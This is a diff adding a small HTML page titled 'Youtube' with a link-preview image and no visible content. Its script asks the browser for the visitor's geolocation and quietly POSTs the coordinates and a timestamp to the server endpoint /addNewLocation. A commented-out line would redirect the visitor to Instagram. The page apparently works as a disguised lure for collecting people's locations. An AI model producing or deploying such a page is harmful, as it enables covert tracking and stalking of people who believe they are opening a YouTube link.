@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="image_src" href="https://andrejgajdos.com/wp-content/uploads/2019/11/social-media-link-1024x507.png" />
+  <title>Youtube</title>
+
+
+</head>
+<body>
+    <script>
+      if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } 
+
+      function showPosition(position) {
+        const body = {
+          lat: position.coords.latitude, 
+          lng: position.coords.longitude,
+          date: Date.now()
+        };
+        console.log("show position");
+        fetch("/addNewLocation", {
+          method: "POST",
+          headers: {"content-type": "application/json; charset=UTF-8"},
+          body: JSON.stringify(body)
+        }).then(res => res.json()).then(data => {
+            console.log(data);
+        });
+        // location.href = "https://www.instagram.com/";
+      }
+    </script>
+</body>
+</html>
